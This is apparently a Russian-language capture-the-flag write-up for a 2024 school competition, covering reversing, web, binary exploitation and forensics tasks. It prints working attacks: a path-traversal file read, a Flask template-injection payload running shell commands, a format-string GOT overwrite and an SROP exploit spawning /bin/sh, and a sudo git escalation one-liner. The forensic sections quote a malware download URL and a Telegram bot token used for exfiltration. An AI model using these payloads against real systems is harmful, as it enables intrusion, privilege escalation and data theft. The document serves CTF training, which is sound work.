# nto_4fun_2024
## REV-1. 
В таске был encrypt ввода, после чего его версия сравнивалась с заданной
 ![Screenshot_2024-03-21_14_07_43](https://github.com/Kreedman05/nto_4fun_2024/assets/164340613/f9103d65-ba78-4d0e-915e-e0956b53be2c)
Для решения таска необходимо было забрутить его значения.
```python
flag_enc_2 = [0xf3, 0xe1, 0xcf, 0xed, 0x23, 0xcd, 0x6b, 0x64, 0x57, 0xad, 0xf9, 0x50, 0xe1, 0xb1, 0x99, 0xf2, 0xe4, 0xb6, 0xa9, 0xc6, 0x4c, 0x61, 0x80, 0x32, 0x02, 0x2b, 0x77, 0x93, 0x43, 0x3a, 0x2c, 0xab, 0x6a, 0x93, 0x0d, 0x2a, 0xd4, 0x14, 0xfa, 0x1b, 0x2f, 0x6f, 0x5d, 0x25, 0x6b, 0xf6, 0x47, 0xc4, 0xf5, 0x6c, 0xd9, 0x5a, 0x12, 0xad, 0x64, 0xe9]
a = [0]*256
for i in range(256):
    num=i
    for j in range(8):
        if (num&1)==0:
            num=num>>1
        else:
            num = num >> 1 ^ 0xedb88320
    a[i] = hex(num)
flag_enc=[0xedcfe1f3, 0x646bcd23, 0x50f9ad57, 0xf299b1e1, 0xc6a9b6e4, 0x3280614c, 0x93772b02, 0xab2c3a43, 0x2a0d936a, 0x1bfa14d4, 0x255d6f2f, 0xc447f66b, 0x5ad96cf5, 0xe964ad12]
for i in flag_enc:
    for k in range(0xff+1):
        for m in range(0xff+1):
            inp = [k,m]
            xor_point = 0xffffffff
            for j in range(2):
                xor_point=abs(int(a[(inp[j] ^ xor_point)&0xff], 16)) ^ (xor_point >> 8)
            if hex(0xffffffff - xor_point) == hex(i):
                print(chr(k)+chr(m),end="")
```

## Web-1.
1. burp
2. target
3. download запрос на file1.txt
4. hint1: указание что флаг в /etc/secret
5. LFI /download?file_type=../../etc/secret
6. Profit!
![web1 1](https://github.com/Kreedman05/nto_4fun_2024/assets/164340613/68bb735e-ca77-4362-b6ce-46de99d7310d)
![web1 2](https://github.com/Kreedman05/nto_4fun_2024/assets/164340613/b980683b-8f5e-42af-bad5-7112e81a6bf6)


## Web-2
При распаковке сервера были написаны креды:
- AdminPassword = "password";
Попробовав их на сервере, иы получили флаг.

## Web-3
403 error bypass(дополнительный / перед flag)
template injection flask
http://192.168.12.11:8001//flag?name={{self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%22cat%20flag.txt%22).read()}}
![web3](https://github.com/Kreedman05/nto_4fun_2024/assets/164340613/14cc0e39-3750-47b6-b74d-4bb765d1c289)

## PWN-1
В задаче была классическая уязвимость форматной строки:
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s[1032]; // [rsp+0h] [rbp-410h] BYREF
  unsigned __int64 v4; // [rsp+408h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  fgets(s, 1024, _bss_start);
  printf(s);
  exit(0);
}
```
Наша цель - прыгнуть в функцию **win**. Мы можем перетереть в .got.plt функцию **exit()** на нашу **win()**. Итоговый эксплойт выглядит так:
```python
from pwn import *

context.binary = exe = ELF("./main")
def start():
    if args.LOCAL:
        return process("./main")
    else:
        return remote(sys.argv[1],sys.argv[2])

io = start()
win = exe.symbols['win']
writes = {0x404018:win}
payload = fmtstr_payload(6,writes,0)
io.sendline(payload)
io.interactive()
```

## PWN-2
В этой задаче нужно было проэксплуатировать переполнение буфера и, используя техинку Sigreturn Oriented Programming (sROP) вывзвать `/bin/sh`.
Сам бинарь имеет всего один сисколл:
```asm
   0x0000000000041000 <+0>:     mov    rdi,0x0
   0x0000000000041007 <+7>:     mov    rsi,rsp
   0x000000000004100a <+10>:    sub    rsi,0x8
   0x000000000004100e <+14>:    mov    rdx,0x1f4
   0x0000000000041015 <+21>:    syscall
   0x0000000000041017 <+23>:    ret
   0x0000000000041018 <+24>:    pop    rax
   0x0000000000041019 <+25>:    ret
```

Идем в гугол и ищем сплойт для sROP:
```python
from pwn import *
def start():
    if args.LOCAL:
        return process("./task")
    else:
        return remote(sys.argv[1],sys.argv[2])

io = start()
offset = 8
BINSH = exe.address + 0x1430
payload = b'a'*8
payload += p64(0x41018)
payload += p64(0xf)
payload += p64(0x41015)

frame = SigreturnFrame()
frame.rax = 0x3b            
frame.rdi = BINSH           
frame.rsi = 0x0             
frame.rdx = 0x0             
frame.rip = 0x41015

payload += bytes(frame)
io.sendline(payload)
io.interactive()
```
## Forensic-1
1. Кто-то скачал архив RAR, который содержал в себе PDF-файл, а также CMD-файл, который скачал полезную нагрузку. Архив лежал по пути **C:\Users\Evgeniy\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\CQ2HQVTU\classfied.rar.ransom**. Судя по расположению архива, он был доставлен по почте.
2. Полезная нагрузка была скачана с [http://95.169.192.220:8080/prikol.exe](http://95.169.192.220:8080/prikol.exe).
3. Уязвимость CVE-2023-38831.
4. Для противодействия отладке используются вызовы из WinAPI - CheckRemoteDebuggerPresent() и IsDebuggerPresent(), Если эти вызовы возвращают True (хотя бы один), то вредонос завершает работу.
5. Программа использует алгоритм AES CBC.
6. amogusamogusamogusamogusamogusam.
7. Программа делает POST запрос по URL [https://api.telegram.org/bot7029575943:AAFNYmmW_QqqMcaHZ-DFRn3M05DptExeAGE/sendDocument](https://api.telegram.org/bot7029575943:AAFNYmmW_QqqMcaHZ-DFRn3M05DptExeAGE/sendDocument) и отправляет файл info.txt боту.
8. sFYZ#2z9VdUR9sm`3JRz.

## Forensic-2

1. GitLab 15.2.
2. Тип уязвимости - RCE (в данном случае CVE-2022-2884)
3. Пользователь git был добавлен в файл /etc/sudoers с правом на исполнение бинаря git, который имел SUID бит и мог выполняться от имени root.
4. Злоумышленник повысил свои привелегии через SUID бинарь - git.
   sudo git -p help config !/bin/sh
5. В папке ~/root/.ssh/authorized_keys есть ключ авторизации для amogus@debian
 **ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIKXFjUp2LlKAsLvM1PZE7CYEfztiZrOf8PHx9ja1mu2 amongus@debian**
6. Злоумышленник просканировал система через linpeas, для повышения привелегий
7. бэкдор LD_PRELOAD через jynx2

